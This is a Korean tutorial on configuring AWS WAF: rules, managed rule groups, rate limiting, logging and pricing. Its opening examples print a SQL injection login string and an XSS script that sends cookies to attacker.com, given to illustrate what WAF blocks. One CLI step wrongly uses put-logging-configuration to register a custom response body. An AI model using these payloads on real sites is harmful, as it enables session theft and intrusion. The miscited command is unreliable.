---
title: AWS WAF (Web Application Firewall)
tags: [aws, waf, security, firewall, ddos, sql-injection, xss, alb, cloudfront]
updated: 2026-01-18
---

# AWS WAF (Web Application Firewall)

## 개요

WAF는 웹 애플리케이션을 보호하는 방화벽이다. HTTP/HTTPS 요청을 검사해서 악의적인 트래픽을 차단한다. SQL Injection, XSS, DDoS 공격을 방어한다. ALB, CloudFront, API Gateway 앞단에 배치한다.

### 왜 필요한가

웹 애플리케이션은 공격에 노출되어 있다.

**문제 상황 1: SQL Injection**

**공격:**
로그인 폼에 악의적인 입력을 한다.

```
Username: admin' OR '1'='1
Password: anything
```

**취약한 코드:**
```sql
SELECT * FROM users WHERE username='admin' OR '1'='1' AND password='anything'
```

`'1'='1'`은 항상 참이다. 모든 사용자 정보가 노출된다.

**문제:**
애플리케이션 코드를 수정해야 한다. 시간이 걸린다. 이미 배포된 코드는 취약하다.

**WAF의 해결:**
WAF가 SQL Injection 패턴을 탐지한다.

```
admin' OR '1'='1
```

이런 패턴이 있으면 요청을 차단한다. 애플리케이션까지 도달하지 않는다.

**문제 상황 2: XSS (Cross-Site Scripting)**

**공격:**
게시판에 스크립트를 삽입한다.

```html
<script>
  document.location='http://attacker.com/steal?cookie='+document.cookie
</script>
```

다른 사용자가 게시글을 보면 쿠키가 탈취된다.

**WAF의 해결:**
`<script>` 태그를 포함한 요청을 차단한다. XSS 공격이 차단된다.

**문제 상황 3: DDoS 공격**

**공격:**
초당 10만 개 요청을 보낸다. 서버가 과부하된다. 정상 사용자가 접근할 수 없다.

**WAF의 해결:**
- 같은 IP에서 초당 100개 이상 요청하면 차단
- 특정 국가의 IP를 차단
- 알려진 봇 IP를 차단

공격 트래픽이 서버에 도달하지 않는다.

## 핵심 개념

### Web ACL (Access Control List)

규칙들의 집합이다. 어떤 트래픽을 허용하고 차단할지 정의한다.

**구성 요소:**
- Rules: 개별 규칙
- Default Action: 규칙에 매칭되지 않는 요청의 처리 (Allow/Block)
- Priority: 규칙 실행 순서

### Rules (규칙)

트래픽을 검사하는 조건이다. 조건에 매칭되면 Action을 실행한다.

**Action 종류:**
- **Allow**: 허용
- **Block**: 차단
- **Count**: 카운트만 (차단하지 않음, 테스트용)
- **CAPTCHA**: 캡차 요구

### Rule Statements

규칙의 조건을 정의한다.

**종류:**
- **IP Set**: 특정 IP 주소 또는 CIDR 블록
- **Geo Match**: 국가 기반
- **Size Constraint**: 요청 크기
- **SQL Injection**: SQL Injection 패턴
- **XSS**: XSS 패턴
- **String Match**: 특정 문자열 포함
- **Rate Limit**: 요청 빈도 제한
- **Regex Pattern**: 정규 표현식 매칭

### Managed Rule Groups

AWS와 파트너사가 제공하는 미리 정의된 규칙 그룹이다. 바로 사용할 수 있다.

**AWS Managed Rules:**
- **Core Rule Set (CRS)**: OWASP Top 10 방어
- **Known Bad Inputs**: 알려진 공격 패턴
- **SQL Database**: SQL Injection 방어
- **Linux Operating System**: Linux 시스템 공격 방어
- **PHP Application**: PHP 취약점 방어
- **WordPress Application**: WordPress 공격 방어

### Capacity Units (WCU)

규칙의 복잡도를 나타낸다. Web ACL은 최대 1,500 WCU까지 사용할 수 있다.

**예시:**
- IP Set 매칭: 1 WCU
- String 매칭: 10 WCU
- Regex 매칭: 25 WCU
- Managed Rule Group: 50-700 WCU

복잡한 규칙일수록 높은 WCU를 사용한다.

## 기본 설정

### Web ACL 생성

**콘솔:**
1. WAF & Shield 콘솔
2. "Create web ACL" 클릭
3. 이름 입력
4. 리소스 타입 선택 (CloudFront, ALB, API Gateway)
5. 리전 선택
6. 리소스 연결
7. 규칙 추가
8. Default action 설정
9. 생성

**CLI:**
```bash
aws wafv2 create-web-acl \
  --name my-web-acl \
  --scope REGIONAL \
  --default-action Allow={} \
  --region us-west-2 \
  --rules file://rules.json \
  --visibility-config \
    SampledRequestsEnabled=true,\
    CloudWatchMetricsEnabled=true,\
    MetricName=MyWebACL
```

**Scope:**
- **REGIONAL**: ALB, API Gateway (리전별)
- **CLOUDFRONT**: CloudFront (글로벌)

### ALB에 연결

**CLI:**
```bash
aws wafv2 associate-web-acl \
  --web-acl-arn arn:aws:wafv2:us-west-2:123456789012:regional/webacl/my-web-acl/a1b2c3d4 \
  --resource-arn arn:aws:elasticloadbalancing:us-west-2:123456789012:loadbalancer/app/my-alb/1234567890abcdef
```

ALB로 들어오는 모든 트래픽이 WAF를 거친다.

## 규칙 작성

### IP 차단

특정 IP 주소를 차단한다.

**IP Set 생성:**
```bash
aws wafv2 create-ip-set \
  --name blocked-ips \
  --scope REGIONAL \
  --ip-address-version IPV4 \
  --addresses 203.0.113.0/24 198.51.100.5/32 \
  --region us-west-2
```

**규칙 생성:**
```json
{
  "Name": "BlockBadIPs",
  "Priority": 0,
  "Statement": {
    "IPSetReferenceStatement": {
      "Arn": "arn:aws:wafv2:us-west-2:123456789012:regional/ipset/blocked-ips/a1b2c3d4"
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "BlockBadIPs"
  }
}
```

`203.0.113.0/24`와 `198.51.100.5`에서 오는 요청을 차단한다.

### 국가 차단

특정 국가의 IP를 차단한다.

```json
{
  "Name": "BlockCountries",
  "Priority": 1,
  "Statement": {
    "GeoMatchStatement": {
      "CountryCodes": ["KP", "IR"]
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "BlockCountries"
  }
}
```

북한과 이란에서 오는 요청을 차단한다.

### Rate Limiting

같은 IP에서 너무 많은 요청이 오면 차단한다.

```json
{
  "Name": "RateLimit",
  "Priority": 2,
  "Statement": {
    "RateBasedStatement": {
      "Limit": 2000,
      "AggregateKeyType": "IP"
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "RateLimit"
  }
}
```

5분 동안 같은 IP에서 2,000개 이상 요청하면 차단한다. DDoS 공격을 방어한다.

### SQL Injection 방어

```json
{
  "Name": "BlockSQLInjection",
  "Priority": 3,
  "Statement": {
    "SqliMatchStatement": {
      "FieldToMatch": {
        "AllQueryArguments": {}
  },
      "TextTransformations": [
        {
          "Priority": 0,
          "Type": "URL_DECODE"
        },
        {
          "Priority": 1,
          "Type": "HTML_ENTITY_DECODE"
        }
      ]
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "BlockSQLInjection"
  }
}
```

쿼리 파라미터에서 SQL Injection 패턴을 찾는다. 발견되면 차단한다.

**FieldToMatch:**
어디를 검사할지 지정한다.
- **AllQueryArguments**: 쿼리 파라미터 전체
- **Body**: 요청 본문
- **UriPath**: URL 경로
- **SingleHeader**: 특정 헤더

**TextTransformations:**
검사 전에 텍스트를 변환한다. URL 인코딩이나 HTML 엔티티를 디코드한다. 우회 공격을 방어한다.

### XSS 방어

```json
{
  "Name": "BlockXSS",
  "Priority": 4,
  "Statement": {
    "XssMatchStatement": {
      "FieldToMatch": {
        "Body": {
          "OversizeHandling": "CONTINUE"
        }
      },
      "TextTransformations": [
        {
          "Priority": 0,
          "Type": "NONE"
        }
      ]
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "BlockXSS"
  }
}
```

요청 본문에서 XSS 패턴을 찾는다. `<script>` 태그 등이 있으면 차단한다.

### 특정 경로 허용

관리자 페이지를 특정 IP에서만 접근하도록 한다.

```json
{
  "Name": "AllowAdminFromOffice",
  "Priority": 5,
  "Statement": {
    "AndStatement": {
      "Statements": [
        {
          "ByteMatchStatement": {
            "SearchString": "/admin",
            "FieldToMatch": {
              "UriPath": {}
            },
            "TextTransformations": [
              {
                "Priority": 0,
                "Type": "NONE"
              }
            ],
            "PositionalConstraint": "STARTS_WITH"
          }
        },
        {
          "NotStatement": {
            "Statement": {
              "IPSetReferenceStatement": {
                "Arn": "arn:aws:wafv2:...:ipset/office-ips/..."
              }
            }
          }
        }
      ]
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "AllowAdminFromOffice"
  }
}
```

**동작:**
- URL이 `/admin`으로 시작하고
- IP가 `office-ips` Set에 없으면
- 차단

사무실 IP에서만 관리자 페이지에 접근할 수 있다.

## Managed Rule Groups 사용

AWS가 제공하는 규칙을 사용한다. 빠르게 보안을 강화한다.

### Core Rule Set

OWASP Top 10을 방어한다.

```json
{
  "Name": "AWSManagedRulesCommonRuleSet",
  "Priority": 10,
  "Statement": {
    "ManagedRuleGroupStatement": {
      "VendorName": "AWS",
      "Name": "AWSManagedRulesCommonRuleSet"
    }
  },
  "OverrideAction": {
    "None": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "AWSManagedRulesCommonRuleSet"
  }
}
```

**방어 항목:**
- SQL Injection
- XSS
- Path Traversal
- Command Injection
- Local File Inclusion (LFI)
- Remote File Inclusion (RFI)

### Known Bad Inputs

알려진 악의적인 입력을 차단한다.

```json
{
  "Name": "AWSManagedRulesKnownBadInputsRuleSet",
  "Priority": 11,
  "Statement": {
    "ManagedRuleGroupStatement": {
      "VendorName": "AWS",
      "Name": "AWSManagedRulesKnownBadInputsRuleSet"
    }
  },
  "OverrideAction": {
    "None": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "AWSManagedRulesKnownBadInputsRuleSet"
  }
}
```

CVE에 등록된 취약점을 악용하는 요청을 차단한다.

### 특정 규칙 비활성화

Managed Rule Group의 특정 규칙이 False Positive를 발생시키면 비활성화한다.

```json
{
  "Name": "AWSManagedRulesCommonRuleSet",
  "Priority": 10,
  "Statement": {
    "ManagedRuleGroupStatement": {
      "VendorName": "AWS",
      "Name": "AWSManagedRulesCommonRuleSet",
      "ExcludedRules": [
        {
          "Name": "SizeRestrictions_BODY"
        }
      ]
    }
  },
  "OverrideAction": {
    "None": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "AWSManagedRulesCommonRuleSet"
  }
}
```

`SizeRestrictions_BODY` 규칙을 비활성화한다. 큰 요청 본문을 허용한다.

## 실무 패턴

### Count 모드로 테스트

새 규칙을 추가할 때 바로 차단하면 정상 트래픽도 차단될 수 있다. 먼저 Count 모드로 테스트한다.

```json
{
  "Name": "TestRule",
  "Priority": 100,
  "Statement": {
    "SqliMatchStatement": {
      "FieldToMatch": {
        "AllQueryArguments": {}
      },
      "TextTransformations": [
        {
          "Priority": 0,
          "Type": "URL_DECODE"
        }
      ]
    }
  },
  "Action": {
    "Count": {}  // 차단하지 않고 카운트만
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "TestRule"
  }
}
```

**동작:**
- 규칙에 매칭되는 요청을 차단하지 않는다
- CloudWatch에 메트릭만 기록한다
- 며칠 동안 모니터링한다
- False Positive가 없으면 Block으로 변경한다

### 화이트리스트 우선

차단 규칙보다 허용 규칙을 먼저 실행한다.

**예시:**
- 모든 국가를 차단한다
- 하지만 미국, 한국, 일본은 허용한다

**규칙 순서:**
```json
// Priority 0: 특정 국가 허용
{
  "Name": "AllowSpecificCountries",
  "Priority": 0,
  "Statement": {
    "GeoMatchStatement": {
      "CountryCodes": ["US", "KR", "JP"]
    }
  },
  "Action": {
    "Allow": {}
  }
}

// Priority 1: 나머지 차단
{
  "Name": "BlockOtherCountries",
  "Priority": 1,
  "Statement": {
    "NotStatement": {
      "Statement": {
        "GeoMatchStatement": {
          "CountryCodes": ["US", "KR", "JP"]
        }
      }
    }
  },
  "Action": {
    "Block": {}
  }
}
```

미국/한국/일본 요청은 Priority 0에서 허용된다. Priority 1에 도달하지 않는다.

### 커스텀 에러 페이지

차단된 요청에 커스텀 응답을 보낸다.

```json
{
  "Name": "BlockWithCustomResponse",
  "Priority": 20,
  "Statement": {
    "IPSetReferenceStatement": {
      "Arn": "arn:aws:wafv2:...:ipset/blocked-ips/..."
    }
  },
  "Action": {
    "Block": {
      "CustomResponse": {
        "ResponseCode": 403,
        "CustomResponseBodyKey": "blocked-message"
      }
    }
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "BlockWithCustomResponse"
  }
}
```

**Custom Response Body 등록:**
```bash
aws wafv2 put-logging-configuration \
  --resource-arn arn:aws:wafv2:...:webacl/... \
  --custom-response-bodies \
    blocked-message='{ContentType=TEXT_HTML,Content="<h1>Access Denied</h1><p>Your IP has been blocked.</p>"}'
```

차단된 사용자에게 커스텀 메시지를 보여준다.

## 모니터링

### CloudWatch 메트릭

**주요 메트릭:**
- **AllowedRequests**: 허용된 요청 수
- **BlockedRequests**: 차단된 요청 수
- **CountedRequests**: Count 모드 요청 수
- **PassedRequests**: 규칙을 거치지 않은 요청 수

**규칙별 메트릭:**
각 규칙마다 메트릭이 생성된다. `MetricName`으로 식별한다.

**알람 설정:**
```bash
aws cloudwatch put-metric-alarm \
  --alarm-name waf-blocked-requests-high \
  --alarm-description "Too many blocked requests" \
  --metric-name BlockedRequests \
  --namespace AWS/WAFV2 \
  --statistic Sum \
  --period 300 \
  --evaluation-periods 1 \
  --threshold 1000 \
  --comparison-operator GreaterThanThreshold
```

5분 동안 1,000개 이상 차단되면 알림을 받는다. 공격이 진행 중일 수 있다.

### 로깅

WAF가 검사한 요청을 로그로 남긴다.

**Kinesis Data Firehose로 전송:**
```bash
aws wafv2 put-logging-configuration \
  --resource-arn arn:aws:wafv2:us-west-2:123456789012:regional/webacl/my-web-acl/a1b2c3d4 \
  --logging-configuration \
    ResourceArn=arn:aws:wafv2:...:webacl/...,\
    LogDestinationConfigs=arn:aws:firehose:us-west-2:123456789012:deliverystream/aws-waf-logs-my-stream
```

**로그 내용:**
- Timestamp
- 요청 IP
- 요청 URL
- HTTP 메서드
- User-Agent
- 매칭된 규칙
- Action (ALLOW/BLOCK)

**S3에 저장:**
Firehose를 통해 S3에 저장한다. Athena로 분석할 수 있다.

**쿼리 예시:**
```sql
SELECT
  COUNT(*) as count,
  httprequest.clientip as ip,
  action
FROM waf_logs
WHERE action = 'BLOCK'
GROUP BY httprequest.clientip, action
ORDER BY count DESC
LIMIT 10;
```

가장 많이 차단된 IP 10개를 확인한다.

## 비용

### Web ACL 비용

**월 비용:**
$5.00 per Web ACL

**규칙 비용:**
$1.00 per rule per month

**예시:**
- Web ACL 1개: $5
- 규칙 10개: $10
- 합계: $15/월

### 요청 비용

**100만 요청당:**
$0.60

**예시:**
월 1억 요청 = 100 × $0.60 = $60/월

### Managed Rule Groups 비용

**AWS Managed Rules:**
무료 ~ $10/월 (Rule Group에 따라 다름)

**예시:**
- Core Rule Set: 무료
- Bot Control: $10/월

### 총 비용 예시

**시나리오:**
- Web ACL 1개
- 커스텀 규칙 5개
- Managed Rule Groups 2개 (무료)
- 월 5천만 요청

**계산:**
- Web ACL: $5
- 규칙: 5 × $1 = $5
- 요청: 50 × $0.60 = $30
- 합계: $40/월

## 참고

- AWS WAF 개발자 가이드: https://docs.aws.amazon.com/waf/
- WAF 요금: https://aws.amazon.com/waf/pricing/
- Managed Rules: https://docs.aws.amazon.com/waf/latest/developerguide/aws-managed-rule-groups.html
- 모범 사례: https://docs.aws.amazon.com/waf/latest/developerguide/waf-chapter-best-practices.html

